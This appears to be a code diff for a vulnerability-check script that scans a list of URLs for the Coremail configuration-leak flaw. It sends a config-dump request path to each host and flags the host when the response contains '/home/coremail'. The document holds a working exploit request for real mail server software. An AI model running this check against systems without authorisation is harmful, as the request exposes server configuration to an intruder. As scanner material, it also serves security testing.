@@ -1,11 +1,21 @@
-#request url = var
+#request urls = array
 #define payload = /mailsms/s?func=ADMIN:appState&dumpConfig=/
 
 function main(args)
 {
-	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
-	if(StrFindStr(res[0],"/home/coremail",0)!= "-1")
-	{
-		print(url."存在coremail_leak");
+	printclolor("当前正在检测:"."coremail_leak",1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],"/home/coremail",0)!= "-1")
+			{
+				printclolor(url."存在coremail_leak",3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
 	}
 }
